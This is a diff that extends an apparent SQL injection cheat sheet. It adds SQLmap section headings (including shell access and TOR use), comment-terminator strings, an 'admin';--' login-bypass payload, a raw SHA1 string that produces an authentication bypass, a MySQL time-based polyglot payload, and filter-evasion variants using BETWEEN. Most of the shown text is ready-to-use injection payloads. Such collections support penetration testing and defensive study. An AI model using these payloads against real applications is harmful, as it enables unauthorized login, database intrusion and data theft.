@@ -19,7 +19,19 @@ Attempting to manipulate SQL queries may have goals including:
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
+  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
+  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
+  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
+  * [Second order injection](#second-order-injection)
+  * [Shell](#shell)
+  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
+  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
+  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
+  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
+  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
+  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
 * [Authentication bypass](#authentication-bypass)
+  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
@@ -41,6 +53,7 @@ Simple characters
 %3B
 )
 Wildcard (*)
+&apos;  # required for XML content
 ```
 
 Multiple encoding
@@ -276,6 +289,9 @@ tamper=name_of_the_tamper
 "&"
 "^"
 "*"
+'--'
+"--"
+'--' / "--"
 " or ""-"
 " or "" "
 " or ""&"
@@ -328,6 +344,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
+admin';-- azer 
 admin" #
 admin"/*
 admin" or "1"="1
@@ -350,7 +367,7 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-## Authentication Bypass (Raw MD5)
+## Authentication Bypass (Raw MD5 SHA1)
 
 When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
 
@@ -362,6 +379,7 @@ Allowing an attacker to craft a string with a `true` statement such as `' or 'SO
 
 ```php
 md5("ffifdyop", true) = 'or'6�]��!r,��b
+sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 ```
 
 Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
@@ -370,6 +388,9 @@ Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.
 
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
+/* MySQL only */
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
 
 ## Routed injection
@@ -428,12 +449,13 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
-No Equal - bypass using LIKE/NOT IN/IN
+No Equal - bypass using LIKE/NOT IN/IN/BETWEEN
 
 ```sql
 ?id=1 and substring(version(),1,1)like(5)
 ?id=1 and substring(version(),1,1)not in(4,3)
 ?id=1 and substring(version(),1,1)in(4,3)
+?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
@@ -449,7 +471,7 @@ Blacklist using keywords case insensitive - bypass using an equivalent operator
 ```sql
 AND   -> &&
 OR    -> ||
-=     -> LIKE,REGEXP, not < and not >
+=     -> LIKE,REGEXP, BETWEEN, not < and not >
 > X   -> not between 0 and X
 WHERE -> HAVING
 ```
